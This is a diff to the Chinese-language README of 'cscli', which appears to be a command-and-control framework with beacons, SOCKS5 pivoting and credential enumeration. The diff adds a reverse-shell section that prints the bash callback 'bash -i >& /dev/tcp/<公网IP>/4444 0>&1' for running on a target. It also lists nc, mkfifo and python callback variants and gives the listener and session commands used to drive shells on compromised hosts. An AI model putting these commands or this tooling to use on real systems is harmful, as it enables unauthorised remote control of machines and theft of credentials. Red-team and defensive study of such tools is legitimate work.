@@ -72,6 +72,30 @@ python3 b.py
 | `socks <port>` / `socks-stop` | 在 beacon 上启动/停止 SOCKS5 内网穿透代理。 |
 | `creds [env|windows|linux|all]` | 枚举操作系统向**当前用户**暴露的凭据（见下“门控凭据接口”）。 |
 
+## 反弹 Shell（bash 回调 → 交互式 Shell）
+
+在 HTTP/HTTPS beacon 之外，cscli 还提供**裸 TCP 反弹 Shell** 监听器，接收经典的
+bash 回调并给你一个交互式 Shell：
+
+```bash
+# 交互式控制台
+cscli> reverse-shell 0.0.0.0 4444
+cscli> rsh-list
+cscli> rsh-shell rsh-1        # 目标上的交互式 shell
+
+# 或用非交互式驱动
+cscli --reverse-shell --host 0.0.0.0 --port 4444 --callback <公网IP> --background
+#   -> JSON 里包含要在目标上运行的回调命令：
+#      bash -i >& /dev/tcp/<公网IP>/4444 0>&1
+cscli --rsh-list
+cscli --rsh-shell rsh-1 --command "id"     # 单发命令 + 输出
+```
+
+支持的回调变体：`bash`、`nc`、`nc-e`、`mkfifo`、`python`。驱动守护进程持有
+实时 socket，并通过磁盘暴露会话状态与命令队列，让无状态 CLI 也能驱动它们。
+（反弹 Shell 控制本质上是交互式的；不带 `--command` 的 `--rsh-shell <sid>` 会
+进入终端式 shell。）
+
 ## 编译二进制 + PE 投递
 
 PyInstaller 把 beacon 打成独立可执行文件（目标无需安装 Python）。PyInstaller
@@ -239,6 +263,8 @@ python3 test_tls.py      # HTTPS + AES-GCM 加密通道 + 模块 tasking
 python3 test_socks.py    # SOCKS5 穿透隧道到内网
 python3 test_compiled.py # PyInstaller 编译二进制端到端
 python3 test_cli_driver.py # 非交互式 CLI 驱动（server/payload/list/task/wait）
+python3 test_rsh.py        # 裸 TCP 反弹 shell（真实 bash 回调）进程内
+python3 test_rsh_cli.py    # 非交互式 CLI 驱动的反弹 shell
 ```
 
 ## 目录结构
